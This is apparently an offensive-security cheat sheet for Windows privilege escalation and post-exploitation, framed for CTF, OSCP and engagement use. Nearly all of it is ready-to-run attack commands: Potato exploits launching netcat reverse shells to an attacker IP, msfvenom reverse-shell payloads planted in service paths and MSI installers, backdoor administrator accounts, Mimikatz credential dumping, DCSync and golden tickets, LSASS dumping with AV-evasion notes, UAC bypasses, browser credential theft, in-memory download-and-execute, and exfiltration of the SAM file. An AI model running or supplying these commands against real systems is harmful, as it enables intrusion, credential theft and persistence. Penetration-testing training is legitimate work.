---
id: "06"
title: "Windows PrivEsc & Post-Exploitation"
tags: ["windows"]
---
# 06 — Windows Privilege Escalation & Post-Exploitation

> **Description:** Windows PrivEsc and post-exploitation — from user shell to SYSTEM and beyond.
> **Best For:** Any Windows target after initial foothold — CTF, OSCP exam, real engagements.
> **Strength:** Complete coverage from Potato attacks through Mimikatz with exact commands and priority ordering.

---

## Decision Tree: Shell on Windows → What First?

> You have a shell on a Windows host (a user session, maybe a meterpreter session). Get your bearings, automate the sweep, then escalate.

```
Shell on Windows, a user session (maybe a meterpreter session) →

  STEP 1: Immediate Situational Awareness (whoami /priv, systeminfo, patch level)
      ↓
  STEP 2: WinPEAS (automate the whole enumeration sweep)
      ↓
  STEP 3: Check your token and services
      → SeImpersonatePrivilege → Potato Attack Chain (a service account? Potato to SYSTEM)
      → Service Misconfigurations (weak service perms, unquoted service paths)
      ↓
  STEP 4: Hunt for credentials
      → Registry Password Hunting (autologon, VNC, PuTTY secrets)
      → Stored Credentials (cmdkey, Credential Manager, config files)
      ↓
  STEP 5: Token Impersonation · Incognito (reuse a token you can already reach)
```

---

## Priority Order Table

| Priority | Technique | Reliability |
| --- | --- | --- |
| 1 | `whoami /priv` → SeImpersonatePrivilege (Potato) | Very High — extremely common on service accounts |
| 2 | Unquoted service paths | High — frequent misconfiguration |
| 3 | Service weak permissions / writable binary | High |
| 4 | AlwaysInstallElevated | Medium — check registry first |
| 5 | Stored credentials (cmdkey, registry) | Medium — often overlooked |
| 6 | Unattend.xml / sysprep credentials | Medium |
| 7 | DLL hijacking | Moderate — needs writable path |
| 8 | Token impersonation (Incognito) | Situational |
| 9 | WinPEAS full scan | Use to find anything missed above |

---

## 1. Immediate Situational Awareness

**Run these within the first 60 seconds of getting a shell.**

```powershell
# Who am I? What privileges do I have?
whoami
whoami /all
whoami /priv         # SeImpersonatePrivilege = check Potatoes NOW

# System information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"

# Network
ipconfig /all
netstat -ano
route print

# Users and groups
net user
net user <USER>
net localgroup
net localgroup administrators

# Running processes
tasklist /v
wmic process get name,executablepath,processid

# Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName\|DisplayVersion"

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /C:"Task To Run" /C:"Run As User" /C:"Status"
schtasks /query /fo LIST 2>nul | findstr TaskName

# Services
wmic service get name,startname,pathname | findstr /i /v "C:\\Windows"
sc query
```

---

## 2. SeImpersonatePrivilege → Potato Attack Chain

**If `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` as Enabled → you have a near-guaranteed path to SYSTEM.**

```powershell
# Check
whoami /priv | findstr /i "Impersonate\|AssignPrimary"
# Output: SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

### GodPotato (Modern — Works on Windows Server 2012–2022 and Win 8–11)

```powershell
# Upload GodPotato.exe to target
# From evil-winrm: upload /kali/GodPotato.exe

# Execute command as SYSTEM
.\GodPotato.exe -cmd "whoami"
.\GodPotato.exe -cmd "net user hacker Hacker123! /add"
.\GodPotato.exe -cmd "net localgroup administrators hacker /add"

# Reverse shell
.\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <YOUR-IP> 4444 -e cmd.exe"

# Download: https://github.com/BeichenDream/GodPotato
```

### PrintSpoofer (Windows 10 / Server 2019)

```powershell
# Upload PrintSpoofer.exe
.\PrintSpoofer.exe -i -c cmd         # Interactive SYSTEM cmd
.\PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe <YOUR-IP> 4444 -e cmd.exe"

# Download: https://github.com/itm4n/PrintSpoofer
```

### JuicyPotato (Windows Server 2016, 2012, Win 7-10 — older boxes)

```powershell
# Requires: SeImpersonatePrivilege + CLSID for target OS
# Upload JuicyPotato.exe and nc.exe

.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe \
  -a "<YOUR-IP> 4444 -e cmd.exe" -t * \
  -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

# CLSIDs by OS: https://ohpe.it/juicy-potato/CLSID/
# Download: https://github.com/ohpe/juicy-potato
```

**If Potatoes fail:** Check OS version. Server 2019+ may need GodPotato. Try all three before moving on.

---

## 3. Service Misconfigurations

### Unquoted Service Paths

```powershell
# Find unquoted paths with spaces (containing spaces without quotes)
wmic service get name,pathname,startname | findstr /i /v "C:\\Windows\\" | findstr /i /v "\""
# Or with sc query:
sc qc <SERVICE-NAME>

# Example vulnerable path: C:\Program Files\My Service\service.exe
# Windows tries these in order:
#   C:\Program.exe
#   C:\Program Files\My.exe         ← plant here if writable
#   C:\Program Files\My Service\service.exe

# Check each directory in the path for write permission
icacls "C:\Program Files\My Service"
# Look for: BUILTIN\Users:(W) or (F) or your username

# Generate malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f exe > My.exe
# OR: net user / add cmd:
# Make a simple C program that adds admin user, compile or use msfvenom

# Upload it to the writable directory
upload My.exe
copy \\<YOUR-IP>\share\My.exe "C:\Program Files\My.exe"

# Restart the service
sc stop <SERVICE-NAME>
sc start <SERVICE-NAME>
# Or wait for reboot if you can't stop/start it
```

### Weak Service Binary Permissions

```powershell
# Check service binary permissions — look for writeable by non-admin users
# AccessChk.exe (Sysinternals):
accesschk.exe /accepteula -ucqv <SERVICE-NAME>
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# PowerShell version:
Get-Acl "C:\path\to\service.exe" | Format-List

# If binary is writeable:
# Replace it with a malicious version
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f exe > malicious.exe
copy malicious.exe "C:\path\to\service.exe"
sc stop <SERVICE-NAME>; sc start <SERVICE-NAME>
```

### Writable Service Registry Key

```powershell
# Check service registry key permissions
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<SERVICE>
# Look for: Write

# Change the binary path
reg add HKLM\System\CurrentControlSet\Services\<SERVICE> \
  /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\malicious.exe" /f
sc stop <SERVICE>; sc start <SERVICE>
```

---

## 4. Registry Password Hunting

```powershell
# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: AutoAdminLogon=1, DefaultUsername, DefaultPassword

# VNC saved password
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# PuTTY saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# mRemoteNG / other RDP tools
reg query "HKCU\Software\mRemoteNG"

# Search registry for password keywords
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

# SAM backup (shadow copies)
reg query HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToBackUp
# SAM locations:
# C:\Windows\repair\SAM
# C:\Windows\System32\config\RegBack\SAM
# C:\Windows\System32\config\SAM
```

---

## 5. Unattend.xml / Sysprep Credentials

**These files are left behind after automated OS deployments and often contain Base64-encoded or plaintext administrator passwords.**

```powershell
# Common locations to check — run all of these
dir /s /b C:\unattend.xml 2>nul
dir /s /b C:\unattend.* 2>nul
dir /s /b C:\sysprep.inf 2>nul
dir /s /b C:\sysprep\sysprep.xml 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\System32\Sysprep\unattend.xml 2>nul
type C:\Windows\System32\Sysprep\Panther\unattend.xml 2>nul

# Extract cred if found
# Look for <Password> tags — value is Base64 encoded
echo "BASE64VALUE" | base64 -d    # On Kali
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64"))  # PowerShell
```

---

## 6. AlwaysInstallElevated

```powershell
# Check both registry keys — BOTH must be 1 for this to work
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must return: AlwaysInstallElevated    REG_DWORD    0x1

# Generate malicious MSI payload
# On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f msi > /tmp/priv.msi
# Or add admin user:
msfvenom -p windows/x64/exec CMD='net user hacker Hacker123! /add' -f msi > /tmp/adduser.msi
msfvenom -p windows/x64/exec CMD='net localgroup administrators hacker /add' -f msi > /tmp/addadmin.msi

# Upload to target and execute
msiexec /quiet /qn /i C:\Windows\Temp\priv.msi
```

---

## 7. Stored Credentials

```powershell
# List saved Windows credentials
cmdkey /list
# Look for: Target=DOMAIN\USER or TERMSRV/<IP>

# Use saved credentials
runas /savecred /user:<DOMAIN>\<USER> "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
runas /savecred /user:administrator "cmd.exe /c nc.exe <YOUR-IP> 4444 -e cmd.exe"

# Check credential manager
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Certificate-Based Credentials" /all

# PowerShell credential files
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## 8. Token Impersonation (Incognito)

```powershell
# From Meterpreter session:
load incognito
list_tokens -u         # List available tokens
impersonate_token "DOMAIN\\Administrator"
# or:
impersonate_token "NT AUTHORITY\\SYSTEM"

# Check result
getuid
getsystem

# Manual token stealing (requires SeImpersonatePrivilege)
# Using Invoke-TokenManipulation.ps1 (PowerSploit):
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"
```

---

## 9. WinPEAS

```powershell
# Download and upload to target
# From evil-winrm:
upload /kali/winPEASx64.exe

# Run and save output
.\winPEASx64.exe | Out-File C:\Windows\Temp\winpeas_out.txt
.\winPEASx64.exe fast    # Faster, less thorough
.\winPEASx64.exe all     # Thorough, slower

# Reading WinPEAS output — RED = exploitable, focus on:
# - SeImpersonatePrivilege / SeAssignPrimaryToken
# - AlwaysInstallElevated
# - Unquoted service paths
# - Writable service paths
# - AutoLogon credentials
# - Unattend.xml / sysprep
# - DLL hijacking opportunities
# - Scheduled tasks with writable paths
# - Stored credentials

# Download: https://github.com/carlospolop/PEASS-ng/releases
# winPEASx64.exe — 64-bit systems
# winPEASx86.exe — 32-bit systems
# winPEAS.bat — if .exe blocked by AV
```

---

## 10. Mimikatz

**Run from SYSTEM or Administrator context. Requires SeDebugPrivilege.**

```powershell
# Upload mimikatz.exe to target
upload /kali/mimikatz.exe

# Or use from Metasploit (in-memory):
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Standard Mimikatz usage:
.\mimikatz.exe

# Enable SeDebugPrivilege (needed for most operations)
privilege::debug
# Output: Privilege '20' OK

# Dump logon passwords (plaintext + NTLM — requires Win7 or with WDigest enabled)
sekurlsa::logonpasswords

# Dump NTLM hashes from SAM database
lsadump::sam
# Requires SYSTEM — elevate first with token::elevate

# Dump LSA secrets
lsadump::secrets

# DCSync (dump domain hashes as if DC)
lsadump::dcsync /domain:<DOMAIN> /all
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

# Dump all tickets (Kerberos)
sekurlsa::tickets /export
kerberos::list /export

# Pass-the-Hash
sekurlsa::pth /user:Administrator /ntlm:<NTLM-HASH> /domain:<DOMAIN> /run:cmd.exe

# Create Golden Ticket
kerberos::golden /user:Administrator /domain:<DOMAIN> \
  /sid:<DOMAIN-SID> /krbtgt:<KRBTGT-HASH> /ticket:golden.kirbi
kerberos::ptt golden.kirbi

# Elevate to SYSTEM (token impersonation)
token::elevate
```

### Enable WDigest (Makes Plain Passwords Available in Memory)

```powershell
# Run from elevated prompt, then wait for a user to log in
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest \
  /v UseLogonCredential /t REG_DWORD /d 1 /f
# After re-auth: sekurlsa::logonpasswords shows plaintext
```

---

## 11. File Transfer Methods

### Kali → Windows Target

```powershell
# PowerShell DownloadFile
(New-Object System.Net.WebClient).DownloadFile("http://<YOUR-IP>:8080/file.exe","C:\Windows\Temp\file.exe")

# PowerShell IWR (wget equivalent)
Invoke-WebRequest -Uri "http://<YOUR-IP>:8080/file.exe" -OutFile "C:\Windows\Temp\file.exe"

# PowerShell IEX — execute in memory (AV evasion, no disk write)
IEX(New-Object Net.WebClient).DownloadString("http://<YOUR-IP>:8080/script.ps1")

# certutil — always available, even restricted environments
certutil -urlcache -split -f http://<YOUR-IP>:8080/file.exe C:\Windows\Temp\file.exe
certutil -decode encoded.b64 output.exe    # Base64 decode

# bitsadmin
bitsadmin /transfer job /download /priority normal http://<YOUR-IP>:8080/file.exe C:\Temp\file.exe

# SMB copy (start impacket-smbserver on Kali first)
copy \\<YOUR-IP>\share\file.exe C:\Windows\Temp\file.exe

# evil-winrm upload
upload /kali/path/file.exe
```

### Windows Target → Kali

```powershell
# PowerShell upload to Python HTTP server (Kali needs: python3 -m uploadserver)
Invoke-RestMethod -Uri "http://<YOUR-IP>:8080/upload" -Method Post \
  -InFile C:\Windows\Temp\proof.txt

# SMB copy back to Kali
copy C:\loot\file.txt \\<YOUR-IP>\share\

# evil-winrm download
download C:\Users\Administrator\Desktop\proof.txt

# Base64 encode and copy
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\config\SAM"))
# Decode on Kali:
echo "BASE64" | base64 -d > SAM
```

---

## 12. Windows Loot & Proof

```powershell
# 1. Capture proof file
type C:\Users\Administrator\Desktop\proof.txt
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"

# 2. Full system info screenshot
whoami && hostname && ipconfig /all

# 3. Dump password hashes
# Via Mimikatz: lsadump::sam
# Via secretsdump from Kali:
impacket-secretsdump <USER>:<PASS>@<TARGET-IP>

# 4. Dump all credentials
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 5. Network map — other internal hosts
netstat -ano
arp -a
route print
net view /domain

# 6. Check for other network shares
net view \\<TARGET-IP>
net use

# 7. Save all found credentials
# Document: username, NTLM hash, plaintext password, source

# 8. Check for domain joined
systeminfo | findstr /i "domain"
wmic computersystem get domain

# 9. Pivot preparation
# Is there a way to reach other segments?
# What ports are open internally?
netstat -ano | findstr LISTENING
```

---

## 13. UAC Bypass

**What it is:** You are in the local Administrators group but running at medium integrity (a normal shell), so you do not actually hold admin rights until you get past User Account Control. These auto-elevating-binary tricks cross to high integrity with no prompt. Confirm the situation first: `whoami /groups | findstr /i "S-1-16-8192"` (medium integrity) plus membership in Administrators.

```powershell
# Fodhelper — the classic, no file drop. Point the payload, then trigger.
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Windows\Temp\shell.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
reg delete "HKCU\Software\Classes\ms-settings" /f

# ComputerDefaults — fodhelper alternative, same registry trick
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Windows\Temp\shell.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
computerdefaults.exe

# Or automate it: UACMe (akagi) has 70+ methods indexed by build
.\Akagi64.exe 33 C:\Windows\Temp\shell.exe
```

---

## 14. LSASS Dumping (Offline)

**What it is:** Instead of running Mimikatz on the box (loud, and heavily signatured), dump the LSASS process memory to a file, pull it back, and parse it offline with pypykatz. Quieter, AV-friendlier, and the modern default. Requires SeDebugPrivilege (admin or SYSTEM).

```powershell
# Living-off-the-land: comsvcs.dll MiniDump (nothing to upload)
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS-PID> C:\Windows\Temp\lsass.dmp full

# nanodump — evasive, avoids the obvious MiniDumpWriteDump API
.\nanodump.exe --write C:\Windows\Temp\lsass.dmp

# procdump — signed Sysinternals binary, often allowlisted
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Parse it offline on Kali (never on the box)
pypykatz lsa minidump lsass.dmp
```

---

## 15. DPAPI & Browser Credentials

**What it is:** Windows encrypts saved secrets (browser passwords, RDP, WiFi, Credential Manager) with DPAPI. As the user, or with their masterkey or SYSTEM, you can decrypt them. This turns a plain user shell into a pile of reusable, often-reused credentials.

```powershell
# Saved WiFi keys
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# Browser logins / cookies and DPAPI triage (Windows)
.\SharpChrome.exe logins
.\SharpDPAPI.exe triage

# From Kali, sweep DPAPI secrets across the host
donpapi -u <USER> -p <PASS> -d <DOMAIN> <TARGET-IP>

# Credential Manager
vaultcmd /listcreds:"Windows Credentials" /all
dir C:\Users\<USER>\AppData\Local\Microsoft\Credentials\
```
